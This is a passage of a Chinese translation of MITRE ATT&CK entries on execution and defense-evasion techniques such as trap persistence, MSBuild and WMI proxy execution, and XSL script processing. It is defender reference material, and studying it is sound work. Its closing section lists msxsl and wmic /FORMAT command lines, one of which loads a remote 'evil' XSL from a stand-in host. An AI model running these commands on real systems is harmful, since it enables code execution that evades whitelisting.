* `source /path/to/filename [arguments]`
* `. /path/to/filename [arguments]`


## T1151 - 文件名末尾空格 Space after Filename
> https://attack.mitre.org/techniques/T1151/
> ID: T1151
> 战术: Defense Evasion, Execution
> 平台: Linux, macOS
> 权限需求: Required: User
> 数据源: File monitoring, Process monitoring
> CAPEC ID: [CAPEC-649](https://capec.mitre.org/data/definitions/649.html)
> Version: 1.0
>
> ---
> https://arstechnica.com/information-technology/2016/07/after-hiatus-in-the-wild-mac-backdoors-are-suddenly-back/

攻击者可以通过更改文件扩展名来隐藏程序真实类型。对于某些文件类型（特别是不适用于.app扩展名的），在文件名后添加空格会更改操作系统处理文件的方式。比如，如果有一个名为evil.bin的Mach-O可执行文件，当用户双击该文件时，它将启动Terminal.app并执行。如果将文件重命名为evil.txt，当用户双击该文件时，它将使用默认文本编辑器启动（而非二进制文件）。但，如果将文件重命名为"evil.txt "（末尾接空格），当用户双击文件时，OS会正确处理文件类型，然后执行二进制文件。


## T1072 - 第三方软件 Third-party Software
> https://attack.mitre.org/techniques/T1072/
> ID: T1072
> 战术: Execution, Lateral Movement
> 平台: Linux, macOS, Windows
> 权限需求: User, Administrator, SYSTEM
> 数据源: File monitoring, Third-party application logs, Windows Registry, Process monitoring, Process use of network, Binary file metadata
> 是否支持远程:  Yes
> Version: 1.1
>
> ---
> https://www.secureworks.com/blog/living-off-the-land
> https://www.secureworks.com/research/wiper-malware-analysis-attacking-korean-financial-sector


第三方应用和软件部署系统可能用在用于管理的网络环境中（如SCCM、VNC、HBSS、Altiris等）。如果攻击者获取了这些系统的访问权限，他们可能通过这些系统执行代码。
攻击者可以访问、使用安装在企业网络中的第三方系统，如管理、监视、部署系统、第三方网关、代理服务器等。对网络范围或企业范围的第三方软件系统的访问可能导致攻击者可以通过该系统，在所有连接到该系统的所有系统上执行代码。这种访问可以用于横向渗透、采集信息或一些特殊目的。
这些操作所需权限因系统配置而异；直接访问第三方系统时，本地凭据即可，或也可能需要特定域凭据。但是，可能需要一个管理帐户来登录系统，执行预期目的。


## T1154 - Trap
> https://attack.mitre.org/techniques/T1154/
> ID: T1154
> 战术: Execution, Persistence
> 平台: Linux, macOS
> 权限需求: User, Administrator
> 数据源: File monitoring, Process monitoring, Process command-line parameters
> Version: 1.1
>
> ---
> https://ss64.com/bash/trap.html
> https://bash.cyberciti.biz/guide/Trap_statement


trap命令允许程序和shell在接收中断信号时执行命令。一种常见的情况是脚本允许正常终止和处理常见的键盘中断，如`ctrl+c`和`ctrl+d`。当shell遇到特定中断以获取执行或作为持久性机制时，对手可以使用它来注册要执行的代码。
Trap命令是以下格式的`trap 'command list' signals`。当接收到“信号”时，“命令列表”将被执行。

## T1127 - 可信开发者实体程序 Trusted Developer Utilities
> https://attack.mitre.org/techniques/T1127/
> ID: T1127
> 战术: Defense Evasion, Execution
> 平台: Windows
> 系统环境需求: MSBuild: .NET Framework version 4 or higher; DNX: .NET 4.5.2, Powershell 4.0; RCSI: .NET 4.5 or later, Visual Studio 2012
> 权限需求: User
> 数据源: Process monitoring
> Defense Bypassed: Application whitelisting
> Version: 1.1
>
> ---
> MSBuild
> https://msdn.microsoft.com/library/dd393574.aspx
> https://lolbas-project.github.io/lolbas/Binaries/Msbuild/
> DNX
> https://docs.microsoft.com/en-us/dotnet/core/migration/from-dnx
> https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/
> RCSI
> https://blogs.msdn.microsoft.com/visualstudio/2011/10/19/introducing-the-microsoft-roslyn-ctp/
> https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/
> WinDbg/CDB
> https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/index
> http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
> Tracker
> https://docs.microsoft.com/zh-cn/visualstudio/msbuild/file-tracking?view=vs-2019
> https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/

有许多实用程序可用于与软件开发相关的任务，这些实用程序可用于执行各种形式的代码，以帮助进行开发，调试和逆向工程。这些实用程序通常可以使用合法证书进行签名，以使它们可以在系统上执行并通过可信任的过程代理执行恶意代码，从而有效地绕过了将应用程序列入防御方案的白名单。

> MSBuild

MSBuild.exe（Microsoft Build Engine）是Visual Studio使用的一个软件构建平台。它使用XML格式项目文件，这些文件定义了构建各平台和配置的需求。
攻击者能使用MSBuild通过一个可信Windows实体程序代理执行代码。.NET v4中引入内联任务功能-MSBuild，允许将C#代码插入XML项目文件中。内联任务MSBuild将编译并执行内联任务。MSBuild.exe由Microsoft签名。
攻击者可以使用MSBuild.exe代理执行任意代码来绕过不考虑MSBuild.exe的应用白名单防护策略。

> DNX

dnx.exe（.NET执行环境）是一个Visual Studio企业版的软件开发工具包。它在2016年被.NET Core CLI取代。DNX并不存在于Windows的标准构建中，只存在于使用较老版本的.NET Core和ASP.NET Core 1.0的开发者工作站中。dnx.exe可执行文件由Microsoft签名。
攻击者可以使用dnx.exe代理执行任意代码来绕过不考虑DNX的应用白名单防护策略。

> RCSI

rcsi.exe使用程序是一个C#的非交互式命令行界面，类似于csi.exe。它在Roslyn .NET Compiler Platform的早期版本中提供，但此后因集成解决方案而被弃用。rcsi.exe二进制文件由Microsoft签名。
可以使用rcsi.exe在命令行上编写和执行C# .csx脚本文件。攻击者可以使用rcsi.exe代理执行任意代码来绕过不考虑rcsi.exe的应用白名单防护策略。


> WinDbg/CDB

WinDbg是一个Microsoft Windows内核和用户模式调试实用程序。Microsoft Console Debugger（CDB）cdb.exe也是一个用户模式的调试程序。两个实体程序都包含在Windows软件开发工具包中，可以作为独立的工具使用。它们通常用于软件开发和逆向工程，在典型的Windows系统上可能找不到。WinDbg.exe和cdb.exe都是由Microsoft签署的二进制文件。
攻击者可以使用WinDbg.exe和cdb.exe代理执行任意代码，以绕过不考虑那些实用程序执行的应用程序白名单策略。 
出于类似的目的，可能还可以使用其他调试器，例如也由Microsoft签名的内核模式调试器kd.exe。

> Tracker
> 文件跟踪器实用程序tracker.exe作为MSBuild的一部分包含在.NET框架中。 它用于记录对Windows文件系统的调用。 
> 攻击者可以使用tracker.exe将任意DLL注入到另一个进程中。由于track.exe也是签名的，所以它可以用来绕过应用程序白名单解决方案。


## T1204 - 用户执行 User Execution
> https://attack.mitre.org/techniques/T1204/
> ID: T1204
> 战术: Execution
> 平台: Linux, Windows, macOS
> 权限需求: User
> 数据源: Anti-virus, Process command-line parameters, Process monitoring
> Version: 1.1
>
> ---
> https://www.proofpoint.com/us/threat-insight/post/ta505-shifts-times
> https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html
> https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf

攻击者可能依赖于用户的特定操作才能执行攻击：

* 直接的代码攻击，例如当用户打开带有[钓鱼附件](https://attack.mitre.org/techniques/T1193)并带有图标和文档文件明显扩展名的恶意可执行文件时。
* 通过其他执行技术，例如，当用户单击通过[钓鱼链接](https://attack.mitre.org/techniques/T1192/)传递的链接时，该链接导致利用[客户端执行攻击](https://attack.mitre.org/techniques/T1203/)浏览器漏洞或应用程序漏洞。
* 使用特殊类型的文件，要求用户执行它们。包括.doc，.pdf，.xls，.rtf，.scr，.exe，.lnk，.pif和.cpl。

例如，攻击者会利用Windows快捷方式文件（.lnk）来诱骗用户点击来执行恶意载荷。恶意的.lnk文件可能包含PowerShell命令。有效载荷可以包含在.lnk文件本身中，也可以从远程服务器下载。
尽管“用户执行”经常在“初始访问”后不久发生，但它可能发生在入侵的其他阶段，例如，当对手将文件放在共享目录中或在用户的桌面上，希望用户单击该文件时。


## T1047 - Windows管理工具(Windows Management Instrumentation，WMI)
> https://attack.mitre.org/techniques/T1047/
> ID: T1047
> 战术: Execution
> 平台: Windows
> 系统环境需求: WMI service, winmgmt, running; Host/network firewalls allowing SMB and WMI ports from source to destination; SMB authentication.
> 权限需求: User, Administrator
> 数据源: Authentication logs, Netflow/Enclave netflow, Process monitoring, Process command-line parameters
> 是否支持远程:  Yes
> Version: 1.0
>
> ---
> https://docs.microsoft.com/zh-cn/windows/win32/wmisdk/wmi-start-page?redirectedfrom=MSDN
> https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf
>

Windows管理工具(WMI)是一种Windows管理特性，为本地和远程访问Windows系统组件提供统一的环境。它依赖WMI服务进行本地和远程访问，依赖服务器消息块（[SMB](https://en.wikipedia.org/wiki/Server_Message_Block)）和远程过程调用服务（[RPCS](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc787851%28v=ws.10%29?redirectedfrom=MSDN)）进行远程访问。RPCS在端口135上运行。[3]
攻击者可以使用WMI与本地和远程系统交互，并将其作为执行许多战术功能的手段，例如收集信息以便发现和远程执行文件作为横向移动的一部分。


## T1028 - Windows远程管理(Windows Remote Management，WinRM)
> https://attack.mitre.org/techniques/T1028/
> ID: T1028
> 战术: Execution, Lateral Movement
> 平台: Windows
> 系统环境需求: WinRM listener turned on and configured on remote system
> 权限需求: User, Administrator
> 数据源: File monitoring, Authentication logs, Netflow/Enclave netflow, Process monitoring, Process command-line parameters
> 是否支持远程:  Yes
> CAPEC ID: [CAPEC-555](https://capec.mitre.org/data/definitions/555.html)
> Version: 1.1
>
> ---
> https://docs.microsoft.com/zh-cn/windows/win32/winrm/portal?redirectedfrom=MSDN
> https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2
> https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc


Windows远程管理(WinRM)是一类Windows服务和协议的统称，允许用户与远程系统交互（例如，运行可执行文件、修改注册表、修改服务）。可以用winrm命令调用它，也可以用PowerShell等任意数量的程序调用它。

## T1120 - XSL Script Processing
> https://attack.mitre.org/techniques/T1220/
> ID: T1220
> 战术: Defense Evasion, Execution
> 平台: Windows
> 系统环境需求: Microsoft Core XML Services (MSXML) or access to wmic.exe
> 权限需求: User
> 数据源: Process monitoring, Process command-line parameters, Process use of network, DLL monitoring
> 可绕过防御类型: Anti-virus, Application whitelisting, Digital Certificate Validation
> Version: 1.1
>
> ---
> https://docs.microsoft.com/zh-cn/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script
> https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
> https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/
> https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75
> https://lolbas-project.github.io/lolbas/Binaries/Wmic/


可扩展样式表语言（Extensible Stylesheet Language，XSL）文件通常用于描述XML文件中的数据处理和呈现。为了支持复杂的操作，XSL标准包括对各种语言的嵌入式脚本的支持。
攻击者可以滥用这个功能来执行任意文件，绕过应用程序白名单防御。与[可信开发者实用程序](https://attack.mitre.org/techniques/T1127/)类似，可以安装Microsoft公共行转换实用程序二进制文件（[msxsl.exe](https://www.microsoft.com/en-us/download/details.aspx?id=21714)），并用于执行嵌入在本地或远程（URL引用）XSL文件中的恶意JavaScript。由于默认情况下未安装msxsl.exe，攻击者可能需要与二阶文件打包一起释放。msxsl.exe有两个主要参数：XML源文件和XSL样式表。由于XSL文件是合法XSL，攻击者可以调用同一个XSL文件两次。使用msxsl.exe时，攻击者还可能给XML/XSL文件一个任意文件扩展名。

命令行形如：

* `msxsl.exe customers[.]xml script[.]xsl`
* `msxsl.exe script[.]xsl script[.]xsl`
* `msxsl.exe script[.]jpeg script[.]jpeg`

该技术另一个变种叫“Squibletwo”，涉及[WMI](https://attack.mitre.org/techniques/T1047/)用XSL文件中调用JScript或VBScript。类似于“[Regsvr32](https://attack.mitre.org/techniques/T1117/)”/“Squiblydoo”，该技术利用受信任内置Windows工具，可以执行本地/远程脚本。攻击者可以利用 `/FORMAT` 开关滥用WMI中的任何别名。

命令行形如：

* Local File：`wmic process list /FORMAT:evil[.]xsl`
* Remote File：`wmic os get /FORMAT:"https[:]//example[.]com/evil[.]xsl"`